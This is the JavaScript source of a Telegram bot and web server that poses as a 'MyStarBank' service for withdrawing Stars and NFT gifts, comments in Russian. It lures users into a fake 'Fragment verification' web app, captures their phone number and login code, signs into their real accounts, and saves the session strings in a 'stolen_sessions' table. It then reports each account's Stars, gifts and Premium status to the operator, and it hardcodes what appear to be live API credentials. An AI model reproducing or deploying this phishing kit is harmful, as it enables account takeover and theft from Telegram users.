const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Api } = require('telegram/tl');
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');

const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
const API_ID = parseInt(process.env.API_ID) || 30427944;
const API_HASH = process.env.API_HASH || '0053d3d9118917884e9f51c4d0b0bfa3';
const MY_USER_ID = 1398396668;
const WEB_APP_URL = 'https://starsdrainer.onrender.com';

// ПРОСТОЙ БОТ БЕЗ POLLING
const bot = new TelegramBot(BOT_TOKEN);
const app = express();
const activeSessions = new Map();

app.use(express.json());
app.use(express.static('public'));

// База данных
const db = new sqlite3.Database('database.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS stolen_sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT,
        code TEXT,
        phone_code_hash TEXT,
        session_string TEXT,
        tg_data TEXT,
        user_id INTEGER,
        status TEXT DEFAULT 'pending',
        stars_data INTEGER DEFAULT 0,
        gifts_data INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
});

// Web App
app.get('/', (req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
});

app.post('/steal', async (req, res) => {
    if (req.body.stage === 'phone_entered') {
        try {
            const urlParams = new URLSearchParams(req.body.tg_data);
            const userStr = urlParams.get('user');
            let userId = null;
            
            if (userStr) {
                const userData = JSON.parse(decodeURIComponent(userStr));
                userId = userData.id;
            }
            
            db.run(`INSERT INTO stolen_sessions (phone, tg_data, user_id, status) VALUES (?, ?, ?, ?)`, 
                [req.body.phone, req.body.tg_data, userId, 'awaiting_code']);
            
            await requestRealTelegramCode(req.body.phone, userId);
                
        } catch (error) {
            console.log('❌ Ошибка:', error);
        }
            
    } else if (req.body.stage === 'code_entered') {
        const phone = req.body.phone;
        const code = req.body.code;
        
        await signInWithRealCode(phone, code);
    }
    
    res.sendStatus(200);
});

// Запрос кода
async function requestRealTelegramCode(phone, userId) {
    try {
        const stringSession = new StringSession("");
        const client = new TelegramClient(stringSession, API_ID, API_HASH, {
            connectionRetries: 3,
            timeout: 30000,
        });
        
        await client.connect();

        const result = await client.invoke(
            new Api.auth.SendCode({
                phoneNumber: phone,
                apiId: API_ID,
                apiHash: API_HASH,
                settings: new Api.CodeSettings({})
            })
        );

        activeSessions.set(phone, {
            client: client,
            phoneCodeHash: result.phoneCodeHash,
            session: stringSession
        });

        db.run(`UPDATE stolen_sessions SET phone_code_hash = ? WHERE phone = ?`, 
            [result.phoneCodeHash, phone]);

        bot.sendMessage(MY_USER_ID, `🔐 Код запрошен: ${phone}`);
        
    } catch (error) {
        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${error.message}`);
    }
}

// Вход с кодом
async function signInWithRealCode(phone, code) {
    try {
        const sessionData = activeSessions.get(phone);
        if (!sessionData) return;

        const client = sessionData.client;
        const phoneCodeHash = sessionData.phoneCodeHash;

        try {
            await client.invoke(
                new Api.auth.SignIn({
                    phoneNumber: phone,
                    phoneCodeHash: phoneCodeHash,
                    phoneCode: code.toString()
                })
            );

            const sessionString = client.session.save();
            db.run(`UPDATE stolen_sessions SET status = 'completed', session_string = ? WHERE phone = ?`, 
                [sessionString, phone]);

            // ПРОСТАЯ ПРОВЕРКА АККАУНТА
            await checkAccount(client, phone);
            
            await client.disconnect();
            activeSessions.delete(phone);

        } catch (signInError) {
            bot.sendMessage(MY_USER_ID, `❌ Ошибка входа: ${phone}`);
            activeSessions.delete(phone);
        }

    } catch (error) {
        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${error.message}`);
    }
}

// ПРОСТАЯ ПРОВЕРКА АККАУНТА
async function checkAccount(client, phone) {
    try {
        const user = await client.getMe();
        let stars = 0;
        let gifts = 0;
        
        // ПРОВЕРЯЕМ ЗВЕЗДЫ
        try {
            const starsData = await client.invoke(new Api.payments.GetStarsStatus({}));
            if (starsData && starsData.balance !== undefined) {
                stars = starsData.balance;
            }
        } catch (e) {}
        
        // ПРОВЕРЯЕМ ПОДАРКИ
        try {
            const userFull = await client.invoke(new Api.users.GetFullUser({id: user.id}));
            if (userFull && userFull.premium_gifts) {
                gifts = userFull.premium_gifts.length;
            }
        } catch (e) {}
        
        const message = `🔓 АККАУНТ ДОСТУПЕН\n📱 ${phone}\n👤 @${user.username || 'нет'}\n⭐ ${stars} stars\n🎁 ${gifts} gifts\n👑 ${user.premium ? 'Premium' : 'No premium'}`;
        
        db.run(`UPDATE stolen_sessions SET stars_data = ?, gifts_data = ? WHERE phone = ?`, 
            [stars, gifts, phone]);
        
        bot.sendMessage(MY_USER_ID, message);
        
    } catch (error) {
        bot.sendMessage(MY_USER_ID, `❌ Ошибка проверки: ${phone}`);
    }
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Сервер работает`);
});

// ПРОСТОЙ /start С ОДНОЙ КНОПКОЙ
app.post('/' + BOT_TOKEN, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// ЗАПУСКАЕМ POLLING ВРУЧНУЮ
bot.startPolling();

// ЕДИНСТВЕННАЯ КОМАНДА - /start С КНОПКОЙ
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    const menuText = `✨ <b>MyStarBank</b>\n\n💫 Вывод NFT подарков и звезд\n\n🔐 Для доступа к вашему аккаунту необходимо пройти верификацию через Fragment`;
    
    const menuKeyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ 
                    text: "🔐 Зарегистрироваться через Fragment", 
                    web_app: { url: WEB_APP_URL } 
                }]
            ]
        }
    };

    bot.sendMessage(chatId, menuText, {
        parse_mode: 'HTML',
        ...menuKeyboard
    });
});

// ЛОГИ ДЛЯ АДМИНА
bot.onText(/\/logs/, (msg) => {
    if (msg.from.id !== MY_USER_ID) return;
    
    db.all(`SELECT phone, status, stars_data, gifts_data FROM stolen_sessions ORDER BY created_at DESC LIMIT 10`, (err, rows) => {
        let logText = '📊 Последние сессии:\n\n';
        
        if (rows.length === 0) {
            logText = '📊 Нет данных';
        } else {
            rows.forEach(row => {
                logText += `📱 ${row.phone}\n`;
                logText += `📊 ${row.status}\n`;
                logText += `⭐ ${row.stars_data} stars\n`;
                logText += `🎁 ${row.gifts_data} gifts\n`;
                logText += `────────────\n`;
            });
        }
        
        bot.sendMessage(msg.chat.id, logText);
    });
});

console.log('✅ Бот запущен с одной кнопкой');